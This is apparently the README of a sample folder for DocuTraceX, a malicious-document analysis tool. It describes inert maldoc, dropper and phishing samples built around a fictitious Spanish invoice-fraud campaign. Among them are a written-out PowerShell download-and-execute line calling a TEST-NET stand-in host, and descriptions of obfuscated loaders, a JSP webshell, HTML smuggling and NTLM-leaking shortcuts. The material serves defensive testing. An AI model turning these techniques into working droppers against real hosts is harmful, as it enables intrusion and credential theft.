# Samples

Realistic, **benign** sample files — one per supported type — to try every
DocuTraceX module. Upload any of them and open the case in **Components**.

<!-- id: gmzpt -->

They all tell one fictitious story: an **invoice-fraud campaign** that
impersonates a supplier, *Suministros Iberia S.L.*, against the finance team of
*Grupo Ejemplo* ("factura 2026-0187 pendiente de pago — hemos cambiado nuestra
cuenta bancaria"). Each file is a structurally real document of its type and
carries the techniques real maldocs use.

> **Nothing here is malware.** Every host is a reserved `*.example` domain
> (RFC 2606), every address a TEST-NET IP (RFC 5737), and the "payloads" are
> inert placeholders (`MZ` + a text line, `MsgBox` scripts). The macros and
> scripts reference those inert values only.

## Getting the files

The samples are stored **compressed and encrypted** in `samples/samples.zip`
with the customary password **`infected`**, so antivirus engines, mail gateways
and Git hosting scanners do not flag or quarantine them (they would: the files
carry real exploit *structures*, even if every payload is inert).

```bash
python scripts/make_samples.py --extract   # unpack into samples/ (git-ignored)
python scripts/make_samples.py             # regenerate samples/samples.zip
```

Or open the archive with 7-Zip, WinRAR or Windows Explorer (password `infected`).
The test suite unpacks it on its own.

## Campaign indicators (all inert)

| Indicator | Role |
|---|---|
| `cdn-update.example.net` — `http://cdn-update.example.net/files/upd.bin` | payload download |
| `198.51.100.23` — `http://198.51.100.23/plantillas/Normal.dotm`, `/a.ps1` | remote template, PowerShell stage 2 |
| `203.0.113.47` | sending VPS, OLE2Link target, form collector |
| `login.rnicrosoft-online.example` | look-alike Microsoft 365 login (phishing page) |
| `suministros-iberia.example.com` | the impersonated supplier |
| `pagos.suministros@mail-box.example.org` | Reply-To used to divert the payment |

<!-- c9omYR6Yrv -->

## What each file contains

| File | What you should see |
|---|---|
| `sample.docm` | *Factura 2026-0187*. VBA downloader (`AutoOpen`/`Document_Open`, `URLDownloadToFileA` declare, hex-decoded URL, `WScript.Shell.Run`), Base64 PowerShell stored in a **document variable**, a **DDEAUTO** field, custom properties, rsids. ViperMonkey emulates the download and the commands. |
| `sample.docx` | Commercial proposal with **remote template injection** (`attachedTemplate` → `198.51.100.23`) and an `INCLUDEPICTURE` tracking image. No macros. |
| `sample.dotx` / `sample.dotm` | Corporate template with a tracking image / a **global template** with `AutoExec` persistence (copies itself to Word STARTUP) and `AutoNew`, plus a remote template. |
| `sample.xlsx` | Invoice sheet with `WEBSERVICE` / `FILTERXML` formulas and a **hidden** sheet holding the "new IBAN". |
| `sample.xlsm` `.xltm` `.xlam` | Same, plus a **very-hidden Excel 4.0 macro sheet** with `Auto_Open` → `CALL(urlmon, URLDownloadToFileA)` + `EXEC(rundll32 …)`, and VBA `Workbook_Open` (XMLHTTP + ADODB.Stream + Shell). |
| `sample.xltx` | Template version of the invoice workbook (no macros). |
| `sample.xlsb` | oletools' benign Excel 4.0 test file (`ALERT` + `HALT` in an XLM macro sheet with `Auto_Open`); see *Third-party* below. |
| `sample.pptx` `.potx` `.sldx` | "New supplier payment procedure" slides with a link to the look-alike login page. |
| `sample.ppsx` | Slideshow with the **mouse-over `ppaction://program`** trick (PowerShell download on hover). |
| `sample.pptm` `.potm` `.ppsm` `.ppam` `.sldm` | Same slides plus VBA `Auto_Open` launching `mshta` through WMI (`Win32_Process.Create`). |
| `sample.doc` | Legacy Word binary: the VBA downloader, SummaryInformation, and an **Equation Editor** object in the ObjectPool (CVE-2017-11882 shape). |
| `sample.dot` | Legacy template with `AutoExec`/`AutoNew` and an **OLE Package** carrying `Factura.pdf.vbs` (extracted and scanned recursively). |
| `sample.xls` `.xlt` `.xla` | BIFF8 workbook with a **very-hidden Excel 4.0 macro sheet** and VBA `Workbook_Open`. |
| `sample.ppt` `.pot` | Legacy PowerPoint with data **appended after the compound file**. |
| `sample.rtf` | RTF invoice: **Equation Editor** object with junk inside `\objdata`, **OLE2Link** + `\objupdate` (CVE-2017-0199) to `203.0.113.47`, an **OLE Package** (`Factura.pdf.vbs`), remote `\*\template`, `INCLUDEPICTURE` and a hyperlink field. |
| `sample.pdf` | Invoice lure "protected by Microsoft 365": **OpenAction JavaScript** obfuscated with `eval(unescape(...))` that exports and opens the embedded `report.docm` and launches the phishing URL (the V8 sandbox unfolds it), a **Launch** action, a link and a **QR code** to the look-alike login, a credential **form submitting** to `203.0.113.47`, and the macro document **embedded**. |
| `sample.eml` | The phishing email: SPF/DKIM/DMARC fail, two `Received` hops from `203.0.113.47`, PHPMailer, Reply-To diversion, a **DKIM signature broken by a later edit** of the amount (1.250,00 → 7.250,00), a **Safe Links + Proofpoint** wrapped link to the look-alike domain, hidden text and a tracking pixel. Attachments: `report.docm`, `pedido.doc` (**the RTF disguised as .doc**), `Factura_2026-0187.pdf.exe` (double extension), `Factura.html` (**HTML smuggling**: `atob` → Blob → download, then redirect) and `escanear.png` (**QR code**). All attachments are analysed recursively. |
| `sample.emlx` | The same message in Apple Mail's `.emlx` wrapper. |
| `sample.msg` | The same message as an Outlook `.msg` (MAPI streams, HTML body, the same attachments). |
| `encrypted/sample_encrypted.eml` | Gateway evasion: `Factura_2026-0187.zip` (**WinZip AES**) holding a **password-protected** `.xlsm`, with *"La contraseña del archivo es: Fact2026"* in the body. DocuTraceX finds the password, opens the ZIP and the workbook, and analyses the macros inside (Nested tab). |
| `encrypted/sample_velvet.xlsm` | The macro workbook encrypted with Excel's built-in **`VelvetSweatshop`** password (opens without a prompt, scanners see only ciphertext): decrypted automatically, flagged high, and the decrypted copy analysed. |

## Deobfuscation demos (standalone scripts)

Dropped/attached scripts whose intent only shows **after deobfuscation** — one per engine, so uploading each exercises the "deobfuscate first, then analyse" path. All inert: the recovered payloads reference the same campaign indicators (`198.51.100.23/a.ps1`, `cdn-update.example.net`). Open **Components → the language tab**: the **Deobfuscated** view carries the recovered code (hits highlighted) with Folder/Download, and **Original (obfuscated)** is one click away.

| File | What you should see |
|---|---|
| `sample_dropper.js` | A `.js` whose whole body is `eval(unescape("%..%.."))` (one long run of percent escapes — the reference case). The multi-pass decoder peels it to a JScript dropper: `MSXML2.XMLHTTP` GET of `cdn-update.example.net`, then `WScript.Shell.Run` of `powershell … -enc <Base64>`. **JavaScript** tab. |
| `sample_obfuscatorio.js` | A `.js` obfuscated with **obfuscator.io** (string-array + rotator + accessor, control-flow flattening) — the scheme the pure-Python cascade can't flatten. With **webcrack** provisioned (portable Node), the Deobfuscated view shows the clean `function stage(){ … }` with the real URL, `powershell -enc …` and `ActiveXObject("WScript.Shell").Run`. **JavaScript** tab. |
| `sample_obf_techniques.js` | JScript dropper stacking the obfuscation techniques DocuTraceX names: fake **jQuery header**, **arithmetic literals** `(40+20)`, a massive `\xNN` **escape block**, a custom **XOR decryptor** with a hard-coded key over a **numeric payload array**, **fromCharCode with arithmetic**, an **IIFE** fed a long string, and **anti-sandbox timing** (`WScript.Sleep` + a `Date` delta). **JavaScript** tab → *Confirmed obfuscation techniques*: 7 static + 4 resolved in the sandbox, including the decrypted (inert) PowerShell payload that targets `billing-portal.example`. |
| `sample_chain_dropper.js` | Three-language chain to see the **whole behaviour** — every decrypted stage becomes a **nested child** re-analysed by whatever fits it: the JScript XOR-decrypts a **VBScript** and drops it → the VBScript runs `powershell -enc …` → the PowerShell stager XOR-decrypts a base64 blob with a string key and inflates a **Deflate** stage that downloads `stage4.ps1` from `billing-portal.example` and starts `inv_viewer.exe`. **Nested** tab: `decrypted_js-xor-dec_….vbs` (🔓 decrypted stage, analysed as vbscript + powershell); the final URL lands in **IOCs**. |
| `sample_wsh_selfread.js` | JScript loader with the **WSH tricks** real droppers use: a `WScript.Sleep` + clock-delta **anti-sandbox** check (passed: the sandbox's Sleep advances a virtual clock), it **reads itself** (`WScript.ScriptFullName`) to pull a payload hidden in a trailing comment, **writes it as a `.ps1`** with FileSystemObject (captured whole → nested child) and launches it hidden through **WMI `Win32_Process.Create`**. The `.ps1` hides a download URL in a **XOR'ed number array held in variables** (`-bxor $rk1`, decimals with leading zeros) and the task-scheduler strings in a **hex-decoder helper** scriptblock, then registers a logon **scheduled task**. **JavaScript** tab (sandbox log: drop, WMI) → **Nested** (`.ps1` with `ps_download`/`ps_iex`, ↗ PowerShell) → **PowerShell** tab (the dropped `.ps1` with its layers: `xor-var-array`, `hex-helper`; scheduled task, `[scriptblock]::Create`) → **IOCs** (`stage5.ps1`). |
| `sample_msxml_dropper.js` | The classic **binary drop** of JScript/VBScript loaders: a PE (inert stub) in base64 decoded through **MSXML** (`createElement` + `dataType = "bin.base64"` + `nodeTypedValue`), written with a **binary `ADODB.Stream`** to `%TEMP%\\invoice_viewer.exe` and run. **JavaScript** tab: `js_sandbox_b64_decode`, `js_sandbox_drop`, `js_sandbox_command`. **Nested**: the dropped `.exe`, byte-identical (recipe `js sandbox → wrote invoice_viewer.exe → exe`). |
| `sample_xor_stager.ps1` | The PowerShell stager alone: base64 + `-bxor` loop with a string key → Deflate (`MemoryStream` in a variable) → final `IEX DownloadString` + `Start-Process`, plus a URL hidden in a number array `[char]($_ -bxor 0x2a)`. **PowerShell** tab. **Nested**: the XOR stage (recipe `base64 → xor('inv')`) and inside it the Deflate stage (`base64 → deflate`) with the download findings. |
| `sample_encoded_blobs.ps1` | PowerShell whose data hides in literals its **own helper functions** decode, so the static deobfuscator leaves them encoded: a base64 of a **GZIP'ed config** (with the C2 URL `billing-portal.example/inv/c2`), an **encrypted-looking blob** and a **hex-encoded PE** (MZ + text stub, inert). **Nested**: every decoded literal becomes a child — the inflated config text (its URL lands in **IOCs**), the opaque blob (*opaque data · entropy ≈ 7.7*) and the `.exe`. |
| `sample_crypto_loader.ps1` | PowerShell loader whose stages are **encrypted with key material written in the script**: a PE (inert stub) **XOR'ed with one byte**, a GZIP'ed config under **AES-256-CBC** with `[byte[]]` key/IV arrays (decrypted by its own helper, so the deobfuscator can't fold it), and a payload in a **SecureString** exported with `-Key (1..32)`. **PowerShell** tab: the SecureString decrypted in place (`securestring`, URL `ss-stage.ps1`). **Nested**: the `.exe` (recipe `base64 → xor(0x5a) → exe`) and the config (recipe `base64 → aes-256-cbc(…) → gzip → text`, URL `aes-c2` in **IOCs**). |
| `sample_invoke_obfuscation.ps1` | Invoke-Obfuscation-style launcher with four layers: an aliased `Invoke-Expression` running a string reversed with `[regex]::Matches(…,'RightToLeft')`; then `&(gcm *ke-e*)` with `-replace 'Qz7',[char]39`; then `iex` built from `$PSHome[4]+$PSHome[30]+'x'` over octal char codes split on `~`; then `$env:ComSpec[4,15,25]-join''` over a reversed string. **PowerShell** tab: `ps_invoke_obfuscation` and the clean invoice downloader. **IOCs**: `billing.invoice-portal.example` and `203.0.113.17`. |
| `sample_xor_loader.vbs` | VBScript loader with the classic **decryptor loop**. The stage is hex text built with `d = d & "…"` lines, XOR'ed with the string key `Factura0613` inside `For i = 1 To Len(d) Step 2 … Chr(CLng("&H" & Mid(d,i,2)) Xor Asc(Mid(k,…)))`, and run with `Execute s`. Inside the stage: `Replace`, `StrReverse` and `Chr(83 Xor 0)` hide an `MSXML2.XMLHTTP` download of the invoice and a hidden PowerShell. **VBScript** tab: methods `xor-loop`, `execute-variable` and the clean stage (plus ViperMonkey emulation when provisioned). **IOCs**: `invoice-cdn.example`, `198.51.100.23`. |
| `sample_dosfuscation.bat` | Batch launcher with **DOSfuscation**: `powershell` rebuilt by a FOR-loop index list over the scrambled set `lrhweops`, the URL reversed with `for /L … (N,-1,0)`, `cmd` sliced from `%COMSPEC:~-n,1%`, and an inline `set` chain in `cmd /V:ON /C "…&&…"` with caret and `""` noise. **Batch** tab: methods `for-loop decode`, `builtin-var slicing`, `quote noise` and the clean `call powershell -w hidden -c iwr …`. **IOCs**: `invoice-files.example`. |
| `sample_exec_chain.py` | Python dropper inside the **exec chain** that public obfuscators produce: an `lzma` + `base85` layer, then a lambda that reverses base64 + `zlib`, then 3 × `zlib.decompress(base64.b64decode(…))`. **Python** tab: `py_exec_layers` (5 layers, recipe shown) and the clean core, which downloads the invoice with `urllib` and starts it hidden. **IOCs**: `invoice-sync.example`, `203.0.113.50`. |
| `sample_lief_helper.dll` | Minimal, inert PE32+ DLL (its only code is `ret`) built for **LIEF**. It has a CodeView **PDB path** (`C:\Users\jmartin\source\repos\InvoiceSync\…\invoice_helper.pdb`), a **forwarded export** `GetFileVersionInfoW → version.GetFileVersionInfoW` (proxy-DLL pattern), a manifest with `requireAdministrator` + `autoElevate`, a wrong header **checksum** and an 8 KB high-entropy **overlay**. **Binary** tab → **LIEF**: `lief_pdb_path`, `lief_forwarded_exports`, `lief_manifest_autoelevate`, `lief_checksum_mismatch`, `lief_overlay_encrypted`. **IOCs**: the PDB path. |
| `sample_stage2.ps1` | A PowerShell stage-2 loader hidden behind backticks (`` I`E`X ``) + Base64 (`[Convert]::FromBase64String`). Deobfuscates to `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')`. With **box-ps** provisioned (portable PowerShell Core), the PowerShell tab also shows a **Sandbox** section with the emulated behaviour. **PowerShell** tab. |
| `sample_dropper.vbs` | A `.vbs` that builds the stage-2 URL from `Chr()` codes and runs PowerShell through an `Execute()` wrapper. The string resolver recovers the URL and unwraps the `WScript.Shell.Run`. **VBScript** tab. |
| `sample_dropper.bat` | A `.bat` using caret escaping (`p^o^w^e^r^shell`) + `set` indirection (`%a%%b%`) to hide a `powershell -enc` launch and a `certutil -urlcache` download. The batch deobfuscator resolves it; rules fire for PowerShell/LOLBin/download. **Batch** tab. |
| `sample_loader.hta` | An `.hta` carrying **both** a VBScript block (`WScript.Shell.Run powershell …`) and a JScript block (`MSXML2.XMLHTTP` GET + `WScript.Shell.Run`). Exercises HTA container extraction into the VBScript **and** JavaScript engines at once. |
| `sample_dropper.py` | A `.py` dropper: `urllib.request.urlopen` of `198.51.100.23`, a `subprocess.Popen("powershell … -enc <Base64>", shell=True)` and an `exec(base64.b64decode(...))` wrapper. The light decoder peels the wrapper; rules fire for download, subprocess, LOLBin, exec and the attack chain. **Python** tab. |
| `sample_dropper.pyc` | The same dropper **byte-compiled**. With **pycdc** provisioned it decompiles to source; otherwise the engine reconstructs the dotted calls (`urllib.request.urlopen`, `subprocess.Popen`…) and strings from the bytecode. Same findings, plus the recovered Python version. **Python** tab. |
| `sample_pyinstaller.exe` | A minimal **PyInstaller-frozen** `.exe`: a PE stub with a CArchive holding the dropper as an entry script. DocuTraceX finds the `MEI` cookie, unpacks the CArchive/PYZ, writes the module back as `.pyc` and analyses it — **PyInstaller** tab (version, entries), **Python** tab (the recovered code) and **Nested** tree. The PE also keeps its hashes/YARA/report. |
| `sample_ioc_noise.bat` | Batch helper with real (inert) IOCs plus **IOC noise** in comments: oletools/colorlog self-URLs, garbage "paths" (`\x4d\x5a…` escapes, mostly non-ASCII components) a `DocuTraceX` install path and fake two-letter TLDs (`cfg.zz`, `row.qq`, `data.xx`, rejected once the IANA list is downloaded). It also carries paths with spaces (the Startup folder under `Start Menu`, a quoted `C:\Program Files\Billing Portal\inv viewer.exe`) that must come out whole, and prose ("paid at month end", "type of payment") that must not become *Command* IOCs; the `powershell …` command must stop at its own line. Only `billing-portal.example`, `accounts@billing-portal.example`, `C:\Users\Public\Documents\invoice_view.exe` and the Startup `.lnk` should appear in the IOCs tab. |
| `lab/dropper_bundle.zip` | A plain ZIP bundling the scripts, shortcuts and Python above (`.js`, obfuscator.io `.js`, `.ps1`, `.vbs`, `.bat`, `.hta`, `.pdf.lnk`, `.url`, `.msi`, `.py`, `.pyc`). Upload it to exercise the **recursive (nested)** path: each child is parsed/deobfuscated on its own, and the recovered URLs appear as the child's IOCs (Nested tab). |

> The same engines run on these scripts wherever they hide — as a standalone upload, as an email/OLE attachment, or inside an archive — not only as loose files.

## Shortcuts and binaries

| File | What you should see |
| --- | --- |
| `sample_shortcut.pdf.lnk` | A `.lnk` disguised as a PDF (**double extension** `…pdf.lnk`) whose target is `cmd.exe` launching a hidden, Base64-encoded PowerShell stage. The **Shortcut** tab shows the target, arguments, working dir, icon and metadata; rules fire for the LOLBin target, the hidden window and the double extension, and the decoded `-enc` payload goes through the scripting engine (`IEX … DownloadString('http://198.51.100.23/a.ps1')` → PowerShell findings). |
| `sample_shortcut.url` | An Internet Shortcut whose `URL=` points to a **remote executable** over `file://203.0.113.47/…` (WebDAV/SMB) and whose `IconFile=` sits on a **UNC path** (forces SMB auth → NTLM hash theft). The **Shortcut** tab lists the URL/icon; rules fire for the remote-file target, the UNC-icon NTLM leak and the executable payload. |
| `sample_installer.msi` | A Windows Installer (OLE/CFB). DocuTraceX decodes the mangled stream names, flags the **CustomAction**, **InstallExecuteSequence** and **Binary** tables, finds the **embedded Binary stream** (inert `MZ` stub), and mines `_StringData` — the PowerShell downloader it carries runs through the scripting engine (`IEX … DownloadString(…)`). **MSI** tab. |

| `sample_packed.exe` | A valid PE32+ that **looks packed**: two `UPX`-named sections (one high-entropy, writable+executable) and no import table. The **Binary** tab shows the pefile triage (type, arch, subsystem, sections with entropy) and rules fire for the packer sections, the high entropy, the W+X flags and the entry point outside `.text`. Inert — it carries no code. **Packer / unpack** tab: UPX detected and **unpacking attempted** — with UPX provisioned `upx -d` runs and, since the UPX data is fake, fails cleanly (`failed`); on a real UPX/AutoIt/Inno/NSIS/SFX/Nuitka/Enigma binary the unpacked files appear in **Nested** (recipe `unpack → upx`) and are analysed recursively. |

> `.exe`/`.dll` and other PE images get **static triage with pefile** (header, sections/entropy, imports grouped by behaviour, resources, signing, packer detection) and keep the generic file record (hashes, YARA, report). They are not disassembled; packed/installer PEs are **unpacked statically** (top level and inside archives/nested children) and the unpacked files analysed as children — deep RE stays with a dedicated tool. With **FLOSS** provisioned, decoded strings are mined for IOCs.

## Java

| File | What you should see |
| --- | --- |
| `sample_app.jar` | An executable JAR. The **Java** tab shows the MANIFEST (`Main-Class`, and a `Premain-Class` → **Java agent** finding) and the bundled `Shell.class`, whose constant pool references `Runtime.exec`, `java.net.URL.openStream`, `ScriptEngineManager`, `defineClass`, `javax.crypto` and a stage URL — rules fire for exec/download/script-engine/defineClass/base64/crypto and the attack chain. With **CFR** + a JVM the class is decompiled to source; otherwise the constant pool carries the signal. The archive is also unpacked into the **Nested** tree. |
| `sample_webshell.war` | A WAR with a **JSP webshell** (`request.getParameter("cmd")` → `Runtime.getRuntime().exec`), a `web.xml` servlet mapping and a bundled `Shell.class`. The **Java** tab flags the JSP input + exec and the web descriptor; entries are recursed in **Nested**. |

> `.jar`/`.war`/`.ear` are ZIP packages, so they are extracted and every entry (including nested jars) is scanned recursively; loose `.class`/`.jsp` are analysed directly.

## Containers and OneNote

| File | What you should see |
| --- | --- |
| `sample_image.iso` | An ISO9660/Joliet disk image carrying `factura.pdf.lnk` + `instalar.bat` — the **Mark-of-the-Web bypass** pattern (mount, double-click the LNK). DocuTraceX extracts the image and scans both: the **Nested** tree shows the LNK (LOLBin + hidden window, its command through the scripting engine) and the batch dropper. |
| `sample_cabinet.cab` | A Microsoft Cabinet holding the batch dropper and the PowerShell stage-2. The CAB is unpacked (stored/MSZIP) and each entry deobfuscated in **Nested** (Batch + PowerShell tabs). |
| `sample_archive.tar.gz` | A gzip tarball of the obfuscated scripts — extracted and recursed like any archive. |
| `sample_notes.one` | A **OneNote** section with two embedded `FileDataStoreObject` lures (an HTA and a VBS). The **OneNote** tab lists the carved payloads; they are then deobfuscated in **Nested** (VBScript/JavaScript/PowerShell). This is the "fake click-to-view button" technique. |

> Containers (ISO/UDF images, CAB, tar/.gz/.bz2/.xz) and OneNote are all handled as **extract → recurse**: every carried file is scanned by the right engine, wherever it hides (standalone, in an email, or nested inside another container).

## Lab: test the network checks safely

`lab/phish_lab.eml` (inside the archive) is the same campaign with its link and an attached login form pointing to a **local phishing-kit simulator**:

```bash
python scripts/phish_lab.py      # serves http://127.0.0.1:8808 (Ctrl+C to stop)
```

Open the email in DocuTraceX and press **Check** on the `127.0.0.1` URL in the IOCs tab. The simulator behaves like a real kit: a bot filter (no browser headers → 404), a redirect, a Microsoft 365 look-alike login prefilled with the address from the link, an obfuscated script that "exfiltrates" to a `*.example` URL, a different page for iPhones (cloaking), and — after **Send fake credentials** — an MFA page linking to a `.docm` download. The simulator's console prints the fake identity it receives.

## Third-party

| File | Source | License |
|---|---|---|
| `sample.xlsb` | [oletools](https://github.com/decalage2/oletools) `tests/test-data/excel4-macros/excel4_sample_macro.xlsb` (benign: `ALERT` + `HALT`) | BSD-2-Clause, © Philippe Lagadec |

<!-- gmzpt -->

Everything else is generated by `scripts/make_samples.py` with the builders in
`scripts/` (`officekit`, `ovba`, `cfb`, `rtfkit`, `pdfkit`, `mailkit`, `mkmsg`).
